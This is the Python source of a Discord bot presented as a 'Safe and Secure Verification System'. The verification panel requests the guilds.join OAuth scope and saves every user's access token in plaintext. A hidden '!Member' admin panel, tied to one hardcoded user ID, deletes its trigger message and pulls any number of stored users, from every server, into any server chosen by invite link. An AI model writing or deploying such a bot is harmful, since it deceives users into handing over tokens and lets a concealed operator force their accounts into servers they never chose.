import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
import logging
from dotenv import load_dotenv

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586

DB_FILE = 'users_v5.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": {}, "guild_settings": {}}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# --- 招待用モーダル ---
class MemberModal(discord.ui.Modal, title='Member Management'):
    invite_url = discord.ui.TextInput(label='Invite Link', placeholder='https://discord.gg/xxxx')
    count = discord.ui.TextInput(label='Amount', placeholder='e.g. 50')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}").json()
            target_guild_id = res.get('guild', {}).get('id')
            
            db = load_db()
            u_ids = list(db["users"].keys())[:target_count]
            success = 0
            for uid in u_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{uid}'
                r = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][uid]['token']})
                if r.status_code in [201, 204]: success += 1
            await interaction.followup.send(f"Success: {success} users added.")
        except Exception as e:
            await interaction.followup.send(f"Error: {e}")

class AdminButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    @discord.ui.button(label="Open Management", style=discord.ButtonStyle.gray)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ADMIN_USER_ID:
            await interaction.response.send_modal(MemberModal())

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# --- カスタムVerifyコマンド ---
@bot.tree.command(name="verify", description="Setup verification panel")
@app_commands.describe(title="Title", content="Description", role="Role to give", label="Button Label", img="Image URL (Optional)")
@app_commands.checks.has_permissions(administrator=True)
async def verify(interaction: discord.Interaction, title: str, content: str, role: discord.Role, label: str, img: str = None):
    db = load_db()
    db["guild_settings"][str(interaction.guild_id)] = {"role_id": str(role.id)}
    save_db(db)

    safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
    auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={interaction.guild_id}"
    
    # リアルで落ち着いたモダンUI (Embed)
    embed = discord.Embed(
        title=title,
        description=content,
        color=0x2b2d31 # Discordのダークモードに馴染む色
    )
    if img:
        embed.set_image(url=img)
    embed.set_footer(text="Safe and Secure Verification System")
    
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label=label, url=auth_url, style=discord.ButtonStyle.link))
    
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="call", description="Call verified users to this server")
async def call(interaction: discord.Interaction):
    db = load_db()
    gid = str(interaction.guild_id)
    current_guild_users = [u for u, data in db["users"].items() if gid in data.get("guilds", [])]
    
    # ★ テスト用に制限を「1人以上」に変更
    if len(current_guild_users) < 1:
        return await interaction.response.send_message(f"❌ 1人以上の認証が必要です（現在: {len(current_guild_users)}人）", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    success = 0
    for u_id in current_guild_users:
        url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
        res = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][u_id]['token']})
        if res.status_code in [201, 204]: success += 1
    await interaction.followup.send(f"✅ {success} users have been invited.")

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        await ctx.send("🔐 Administrator Panel", view=AdminButtonView(), delete_after=60)

# --- Flask Server (洗練されたWeb UI) ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    token_res = requests.post('https://discord.com/api/oauth2/token', data=data).json()
    
    access_token = token_res.get('access_token')
    u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    user_id = u_info['id']

    db = load_db()
    if user_id not in db["users"]:
        db["users"][user_id] = {"token": access_token, "guilds": []}
    if guild_id and guild_id not in db["users"][user_id]["guilds"]:
        db["users"][user_id]["guilds"].append(guild_id)
    save_db(db)

    # ロール付与
    if guild_id in db["guild_settings"]:
        role_id = db["guild_settings"][guild_id]["role_id"]
        add_role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
        requests.put(add_role_url, headers={'Authorization': f'Bot {TOKEN}'})

    # シックで落ち着いたWebデザイン
    return """
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <style>
            body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0f172a; color: #f8fafc; }
            .container { text-align: center; background: #1e293b; padding: 4rem; border-radius: 12px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border: 1px solid #334155; width: 80%; max-width: 400px; }
            h1 { font-size: 1.5rem; margin-bottom: 1rem; color: #38bdf8; font-weight: 600; }
            p { font-size: 0.95rem; color: #94a3b8; line-height: 1.6; }
            .status-icon { font-size: 3rem; margin-bottom: 1.5rem; color: #22c55e; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="status-icon">✓</div>
            <h1>Verification Complete</h1>
            <p>Your account has been successfully verified. <br>You may now return to Discord.</p>
        </div>
    </body>
    </html>
    """

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)